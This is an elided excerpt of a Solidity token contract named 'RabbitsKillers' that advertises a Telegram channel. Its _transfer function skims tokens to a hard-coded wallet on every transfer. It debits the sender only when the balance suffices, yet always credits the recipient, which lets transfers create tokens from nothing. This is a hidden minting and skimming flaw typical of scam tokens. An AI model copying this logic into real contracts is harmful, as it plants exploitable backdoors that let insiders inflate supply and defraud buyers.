...
// Submitted for Telegram: https://t.me/RabbitsKillers
...
contract  RabbitsKillers  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x0779a27a3d13adD60C41FaC5A411934B9095E8B1] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x0779a27a3d13adD60C41FaC5A411934B9095E8B1, _teamtoken);
        }
